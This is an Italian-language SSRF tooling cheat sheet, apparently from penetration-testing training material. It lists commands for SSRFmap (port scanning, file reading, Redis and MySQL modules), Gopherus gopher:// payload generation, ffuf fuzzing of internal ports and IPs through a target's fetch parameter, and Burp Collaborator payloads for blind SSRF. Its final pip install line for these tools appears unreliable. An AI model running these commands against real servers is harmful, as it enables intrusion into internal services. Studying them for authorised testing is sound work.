🔧 Strumenti Automatici per SSRF

Automatizzare discovery, bypass e exploitation
🗺️ SSRFmap
Framework SSRF completo con moduli per vari servizi:
# Installazione git clone https://github.com/swisskyrepo/SSRFmap cd SSRFmap && pip3 install -r requirements.txt # Uso base python3 ssrfmap.py -r request.txt -p url -m portscan # Moduli disponibili python3 ssrfmap.py -r request.txt -p url -m readfiles python3 ssrfmap.py -r request.txt -p url -m redis python3 ssrfmap.py -r request.txt -p url -m mysql
🐿️ Gopherus
Genera payload gopher:// per vari servizi:
# Installazione git clone https://github.com/tarunkant/Gopherus cd Gopherus # Genera payload per Redis python gopherus.py --exploit redis # Genera payload per MySQL python gopherus.py --exploit mysql # Genera payload per FastCGI python gopherus.py --exploit fastcgi
🔍 ffuf + Wordlist
Fuzzing per trovare endpoint interni:
# Port scanning con ffuf ffuf -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ" \ -w ports.txt -mc all -fc 500 # Fuzzing IP interni ffuf -u "http://target.com/fetch?url=http://192.168.1.FUZZ" \ -w numbers.txt -mc 200 # Bypass techniques ffuf -u "http://target.com/fetch?url=FUZZ" \ -w ssrf-bypass.txt
🎯 Burp Suite
Collaborator + Intruder per SSRF:
# 1. Genera Burp Collaborator URL # → xxxxx.burpcollaborator.net # 2. Usa Intruder con payload http://127.0.0.1:§port§ http://§ip§.burpcollaborator.net # 3. Controlla Collaborator per # callback (conferma SSRF blind)

Estensioni utili: Collaborator Everywhere, SSRF King

pip3 install ssrfmap gopherus apt install ffuf # Kali Linux
